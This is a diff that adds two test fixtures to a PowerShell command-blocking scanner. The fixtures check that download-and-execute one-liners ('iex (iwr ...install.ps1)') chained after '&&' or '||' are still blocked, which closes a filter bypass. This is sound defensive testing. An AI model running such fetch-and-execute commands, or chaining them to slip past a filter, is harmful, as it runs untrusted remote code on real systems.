@@ -1634,3 +1634,29 @@ context = "exec"
 shell = "powershell"
 expected_action = "block"
 expected_rules = ["ps_set_execution_policy_bypass"]
+
+# PowerShell 7+ pipeline chain operators `&&` and `||` are now first-class
+# separators in tokenize_powershell. With `;`-only splitting (the M5 chunk 1
+# state) the attacker could bypass `ps_inline_download_execute` by chaining
+# the download-execute behind `&&` or `||`. These fixtures pin the gap closure:
+# the leading segment can be anything; the trailing `iex (iwr ...)` must
+# still fire `ps_inline_download_execute` because the new separators are NOT
+# in the `is_pipe_separator` allowlist (so the rule's narrow-skip guard
+# correctly lets the inline download-execute through).
+[[fixture]]
+name = "ps_iex_inline_after_and_chained"
+min_milestone = 5
+input = "Get-Date && iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+
+[[fixture]]
+name = "ps_iex_inline_after_or_chained"
+min_milestone = 5
+input = "Test-Path nope || iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
